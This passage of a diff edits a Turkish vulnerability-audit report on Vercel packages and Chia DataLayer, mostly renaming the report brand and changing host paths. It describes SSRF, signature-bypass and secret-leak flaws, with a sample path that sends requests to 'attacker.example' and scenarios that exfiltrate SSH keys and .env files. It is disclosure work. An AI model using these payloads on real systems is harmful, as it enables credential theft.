 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Abone Olunan DataLayer Mağazalarında Ayna (Mirror) URL'lerinin Otomatik İndirilmesi (`chia/data_layer/download_data.py`):** Bir Chia DataLayer düğümü bir veri mağazasına abone olduğunda, zincir üstünde duyurulan Mirror URL adreslerine `aiohttp.ClientSession.get(...)` ile otomatik HTTP/HTTPS isteği göndererek `.dat` dosyalarını indirir.
@@ -3145,7 +3145,7 @@ grep -n -C 10 "session.get" /home/community-user/targets/chia-blockchain/chia/da
 * **Hedef Depo & Paket:** `vercel/next.js` (`npm / Node.js: next`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`, `packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201`
 * **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-918 / CWE-345` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `createRedirectRenderResult()` İçinde Eksik `redirect: 'manual'` ve Şema-Bağıl (`//host`) URL Kabulü (`action-handler.js:270-303`):** `forwardActionToWorker()` fonksiyonu `redirect: 'manual'` (satır 175) kullanırken, hemen altındaki `createRedirectRenderResult()` fonksiyonu `await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } })` çağrısını varsayılan `redirect: 'follow'` ile çalıştırır.
@@ -3251,7 +3251,7 @@ git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patc
 * **Hedef Depo & Paket:** `vercel/next.js` (`npm / Node.js: next`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/image-optimizer.ts:696-729`, `packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`)
 * **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-863` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `remotePatterns` Kontrolünün Yalnızca İlk İstek Hopunda Yapılması (`image-optimizer.js:586-615`):** `validateParams()` fonksiyonu `hasMatch(domains, remotePatterns, href)` kontrolünü yalnızca ilk `/_next/image?url=...` parametresinde çalıştırır. İzin verilen sunucu `301`/`302`/`307`/`308` döndürdüğünde `fetchExternalImage()` yeni `Location` adresini yalnızca `validateUrl()` fonksiyonuna sokar; `hasMatch()` kontrolünü tekrar çağırmaz. Böylece hem **aynı sunucu içindeki dizin kısıtlamaları** (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) hem de **farklı alan adı kısıtlamaları** tamamen aşılır.
@@ -3354,7 +3354,7 @@ git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patc
 * **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: vercel`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 65.4.0 (verified on published npm vercel@65.4.0)` — `packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`, `packages/cli/src/commands/http-cli/index.ts`
 * **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-436` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — WHATWG `new URL()` İle `libcurl` (`curl_url_set`) Arasındaki Ters Eğik Çizgi (`\\@`) Ayrıştırıcı Farkı (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` fonksiyonu `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...` kontrolünü yaptıktan sonra normalize edilmiş `url.href` yerine **ham metin birleştirmesini** (`return \`${baseUrl}${normalizedPath}\``) döndürür. `path` olarak `\\@attacker.example/collect` verildiğinde WHATWG `new URL()` bunu aynı kökenli bir dizin yolu sayarken, `/usr/bin/curl` ikili dosyasına giden `https://my-app.vercel.app\\@attacker.example/collect` dizgesi `libcurl` tarafından `my-app.vercel.app\\` kullanıcı adıyla **`attacker.example`** sunucusuna yapılan bir istek olarak ayrıştırılır!
@@ -3422,7 +3422,7 @@ git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patc
 * **Hedef Depo & Paket:** `vercel/flags` (`npm / Node.js: @vercel/flags-core`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)` — `packages/flags-core/src/controller.ts:555-615`, `packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`)
 * **Zafiyet Sınıfı & Skor:** `CWE-400 / CWE-345` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Yanıt Gövdesi ve `res.ok` Doğrulanmadan `datafileUpdatedAtWatermark` Değerinin Güncellenmesi (`packages/flags-core/src/controller.ts:555-615`):** `@vercel/flags-core` içindeki `streamResponse()` metodu, `res.ok` (`200 OK`) durumunu ve geçerli bir JSON veri dosyasını doğrulamadan `x-datafile-Updated-At` başlığını okuyup `this.datafileUpdatedAtWatermark` değerini günceller.
@@ -3487,7 +3487,7 @@ git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patc
 * **Hedef Depo & Paket:** `vercel/flags` (`npm / Node.js: flags`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 4.4.0 (verified on published npm flags@4.4.0)` — `packages/flags/src/next/precompute.ts:206-214`, `packages/flags/dist/next/index.js:119-125` (`deserialize`)
 * **Zafiyet Sınıfı & Skor:** `CWE-347` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — JWS İmza Doğrulamasından Önce Koşulsuz `__no_flags__` Dönüşü (`packages/flags/src/next/precompute.ts:206-214`):** `serialize()` fonksiyonu yalnızca `flags.length === 0` olduğunda `'__no_flags__'` üretirken, `deserialize(flags, code, secret)` fonksiyonu `flags.length === 0` olup olmadığını kontrol etmeden ve `compactVerify()` imza doğrulamasına hiç girmeden `if (code === '__no_flags__') return {};` döndürür.
@@ -3552,7 +3552,7 @@ git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patc
 * **Hedef Depo & Paket:** `vercel/firewall` (`npm / Node.js & Go: @vercel/firewall`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)` — `packages/firewall/src/rate-limit.ts:138-183, 211-285`, `cmd/ipc-proxy/client.go:34-41, 79-97`
 * **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-200 / CWE-636` — **CVSS v3.1: `7.2 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Doğrulanmamış `Host` Başlığının Giden HTTPS URL'sine Enjekte Edilmesi (`packages/firewall/src/rate-limit.ts:138-167, 224`):** `VERCEL_ENV !== 'production'` olduğunda (staging, preview veya kendi sunucusunda çalışan kurulumlar), `resolveFirewallHost()` gelen isteğin `Host` başlığını alır ve doğrulama yapmadan `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check` adresine `POST` isteği gönderir.
@@ -3620,7 +3620,7 @@ git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patc
 * **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/hashes.ts:115-167`, `packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`)
 * **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-706` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `filesFromFilePathMap()` İçinde Sınır Kontrolsüz `path.resolve(cwd, filePath)` (`packages/client/src/utils/hashes.ts:115-167`):** `vercel deploy --prebuilt` çalıştığında `@vercel/client`, `.vercel/output/functions/**/.vc-config.json` içindeki `filePathMap` tablosunu okur ve `path.resolve(cwd, filePath)` ile çözümlenen her dosyayı proje kökü (`cwd`) veya `.vercelignore` kontrolü yapmadan okur.
@@ -3644,7 +3644,7 @@ export async function filesFromFilePathMap(
 
 #### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
 * **Senaryo A — `vercel build && vercel deploy --prebuilt` Sırasında `.vercelignore` Aşılarak `.env.local` Sırlarının Yüklenmesi:** `.vercelignore` içinde `.env*` bulunsa bile `filePathMap` üzerinden `.next/required-server-files.json` yüklendiği için yerel sırlar dağıtım paketine girer.
-* **Senaryo B — Ayrık CI/CD Hattında (`build` -> `deploy --prebuilt`) Konak Dosyası Sızıntısı:** PR derleme adımında üretilen `.vercel/output` içindeki `filePathMap`, ayrıcalıklı dağıtım adımında `/home/runner/.npmrc` gibi dosyaları Vercel'e yükler.
+* **Senaryo B — Ayrık CI/CD Hattında (`build` -> `deploy --prebuilt`) Konak Dosyası Sızıntısı:** PR derleme adımında üretilen `.vercel/output` içindeki `filePathMap`, ayrıcalıklı dağıtım adımında `${HOME}/.npmrc` gibi dosyaları Vercel'e yükler.
 * **Senaryo C — Paylaşılan Monorepo Derleme Önbelleği Zehirlemesi:** Önbellekten gelen `.vc-config.json` dağıtım sırasında konak dosyalarını sızdırır.
 
 #### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
@@ -3683,7 +3683,7 @@ git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patc
 * **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/index.ts:116-148`, `packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`)
 * **Zafiyet Sınıfı & Skor:** `CWE-59 / CWE-200` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `buildFileTree()` İçinde Doğrulanmamış `config.bulkRedirectsPath` ve Symlink Takibi (`packages/client/src/utils/index.ts:116-148`):** `prebuilt: true` modunda `buildFileTree()`, `.vercel/output/config.json` içinden `config.bulkRedirectsPath` değerini okur ve `join(cwd, config.bulkRedirectsPath)` dizinini `fs.stat()` (sembolik bağları takip eder) ile tarar; `fs.realpath()` ile proje kökü sınır kontrolü yapmaz.
@@ -3702,7 +3702,7 @@ if (config?.bulkRedirectsPath) {
 ```
 
 #### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
-* **Senaryo A — `bulkRedirectsPath` İçindeki Sembolik Bağ İle SSH/Bulut Anahtarlarının Sızdırılması:** `.vercel/output/config.json` içinde tanımlanan `bulkRedirectsPath` dizinine `/home/runner/.ssh/id_rsa` yönlendiren bir sembolik bağ konulduğunda `buildFileTree()` bu bağı takip ederek özel anahtarı dağıtıma yükler.
+* **Senaryo A — `bulkRedirectsPath` İçindeki Sembolik Bağ İle SSH/Bulut Anahtarlarının Sızdırılması:** `.vercel/output/config.json` içinde tanımlanan `bulkRedirectsPath` dizinine `${HOME}/.ssh/id_rsa` yönlendiren bir sembolik bağ konulduğunda `buildFileTree()` bu bağı takip ederek özel anahtarı dağıtıma yükler.
 * **Senaryo B — `config.json` İçinde Üst Dizin Geçişi (`"bulkRedirectsPath": "../../secrets"`):** Üst dizin yolu verilerek proje kökü dışındaki klasörün tamamı taranıp yüklenir.
 * **Senaryo C — `.vercelignore` İhlali:** `.vercelignore` ile engellenen yerel sır dosyaları `bulkRedirectsPath` üzerinden dağıtıma dahil edilir.
 
